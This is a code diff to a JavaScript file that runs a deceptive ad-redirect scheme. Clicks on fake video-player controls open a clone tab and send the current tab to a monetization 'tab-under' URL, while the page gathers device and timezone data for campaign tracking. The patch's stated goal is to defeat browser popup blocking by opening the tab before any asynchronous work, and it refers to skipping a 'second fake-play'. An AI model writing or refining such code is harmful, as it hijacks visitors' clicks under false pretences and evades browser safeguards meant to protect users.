@@ -1,7 +1,11 @@
-/* common.js — vanisher-style micro handoff
+/* common.js — vanisher-style micro handoff (patched)
    v1: micro -> open CLONE tab, current tab redirects to TABUNDER (AFU)
    v2 (clone): ANY click anywhere -> MAIN EXIT (micro disabled, no more clones)
    Supports: mainExit, tabUnderClick, back, reverse, autoexit
+
+   Patch:
+   - open clone tab BEFORE any await (prevents popup-block / delays)
+   - clone url includes __skipPreview=1 (so preview script can skip second fake-play)
 */
 
 (() => {
@@ -17,11 +21,13 @@
     try { window.location.replace(url); } catch { window.location.href = url; }
   };
 
+  // Open immediately (better for mobile popup rules)
   const openTab = (url) => {
     try {
-      const w = window.open(url, "_blank");
+      const w = window.open("about:blank", "_blank");
       if (w) {
         try { w.opener = null; } catch {}
+        try { w.location.replace(url); } catch { try { w.location.href = url; } catch {} }
       }
       return w || null;
     } catch {
@@ -68,6 +74,9 @@
       return "";
     }
   };
+
+  // cache (avoid repeated delays)
+  const osVersionPromise = getOsVersion();
 
   const buildCmeta = () => {
     try {
@@ -143,7 +152,7 @@
       campaignid: IN.campaignid || "",
       click_id: IN.s || "",
       rhd: IN.rhd || "1",
-      os_version: (await getOsVersion()) || "",
+      os_version: (await osVersionPromise) || "",
       btz: getTimezoneName(),
       bto: String(getTimezoneOffset()),
       cmeta: buildCmeta(),
@@ -363,6 +372,7 @@
   const buildCloneUrl = () => {
     const u = new URL(window.location.href);
     u.searchParams.set(CLONE_PARAM, "1");
+    u.searchParams.set("__skipPreview", "1"); // <— so clone can skip preview/replay
     return u.toString();
   };
 
@@ -380,22 +390,24 @@
 
     // one per session (per browser tab sessionStorage)
     if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") {
-      // if already done, degrade to mainExit
       return run(cfg, "mainExit");
     }
+
+    // set immediately (sync)
     safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));
 
+    // IMPORTANT: open clone tab BEFORE any await (popup rules)
     const cloneUrl = buildCloneUrl();
-    const monetUrl = await buildTabUnderUrl(cfg);
-
     safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
     openTab(cloneUrl);
+
+    // now compute monetization url (can be async, doesn't affect popup)
+    const monetUrl = await buildTabUnderUrl(cfg);
 
     if (monetUrl) {
       safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
       replaceTo(monetUrl);
     } else {
-      // fallback
       run(cfg, "mainExit");
     }
   };
@@ -406,6 +418,7 @@
   const initClickMap = (cfg) => {
     const fired = { mainExit: false, back: false };
 
+    // MICRO targets (per your layout)
     const microTargets = new Set([
       "timeline",
       "play_pause",
@@ -420,7 +433,7 @@
       const zone = e.target?.closest?.("[data-target]");
       const t = zone?.getAttribute("data-target") || "";
 
-      // Back stays as "back exit" (as before)
+      // Back stays as "back exit"
       if (t === "back_button") {
         if (fired.back) return;
         fired.back = true;
